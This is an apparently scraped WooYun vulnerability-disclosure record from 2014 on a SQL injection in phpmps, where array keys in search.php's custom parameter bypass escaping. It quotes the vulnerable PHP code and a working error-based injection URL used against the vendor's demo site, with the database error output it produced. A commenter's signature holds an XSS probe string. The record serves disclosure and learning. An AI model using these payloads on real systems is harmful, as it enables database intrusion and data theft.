{"id": 52559, "wybug_id": "wooyun-2014-070873", "wybug_title": "phpmps弱过滤导致注入漏洞", "wybug_corp": "phpmps.com", "wybug_author": "小飞", "wybug_date": "2014-08-04 13:42", "wybug_open_date": "2014-11-02 13:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-08-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-08-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-09-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-08：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-18：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-02：\t细节向公众公开  简要描述： 不过滤 会出事 详细说明：  首先全局过滤文件 addslashes_deep和sql_replace全部是针对数组的value的所以 key呢。。。\nif(!get_magic_quotes_gpc()) {\tif (!empty($_GET))$_GET  = addslashes_deep($_GET);    if (!empty($_POST))$_POST = addslashes_deep($_POST);    $_COOKIE   = addslashes_deep($_COOKIE);    $_REQUEST  = addslashes_deep($_REQUEST);}if (!empty($_REQUEST))$_REQUEST  = sql_replace($_REQUEST);if (!empty($_POST))$_POST  = sql_replace($_POST);if (!empty($_GET))$_GET  = sql_replace($_GET);unset($_REQUEST['table']);\n由于key被忽视  所以在/search.php 下\nif(!empty($_REQUEST['custom'])) {\t$sql = \"SELECT infoid, COUNT(*) AS num FROM {$table}cus_value WHERE 0 \";\tforeach($_REQUEST['custom'] AS $key => $val) {\t\tif(!empty($val)) {\t\t\t\t\t$cus_num++;\t\t\t$sql .= \" or (1 \";\t\t\tif(is_array($val)) {\t\t\t\t$cus_tom = get_custom_info($key);\t\t\t\t$sql .= \" AND cusid = '$key'\";\nget_custom_info($key)在function get_custom_info($cusid='')里面\n$sql = \"select * from {$table}custom where cusid='$cusid' \";\t\t$res = $db->query($sql);\n直接查询了导致注入   漏洞证明：  官网测试：http://www.phpmps.com/demo/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%20COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1返回信息，成功获取版本信息：\nMySQL server error report:Array ( [0] => Array ( [message] => MySQL Query Error ) [1] => Array ( [sql] => SELECT infoid, COUNT(*) AS num FROM demo_cus_value WHERE 0 or (1 AND cusid = 'xss') AND (SELECT 8734 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)#' AND cusvalue like '%1%' ) GROUP BY infoid HAVING num = '1' ) [2] => Array ( [error] => Duplicate entry '5.0.96-community-nt1' for key 1 ) [3] => Array ( [errno] => 1062 ) )\n没各种限制 直接注入\n\n没有过滤\n\n   修复方案：  全局修复求不略 求20   版权声明：转载请注明来源 小飞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-08-04 20:29 厂商回复： 非常感谢小飞提供漏洞，我们会尽快修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-24 17:10 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  又是一个$key的经典案例    \n     2015-03-29 12:58 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:54        | 潜心代码审计。)\t\t \n  经典！本菜学习了！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}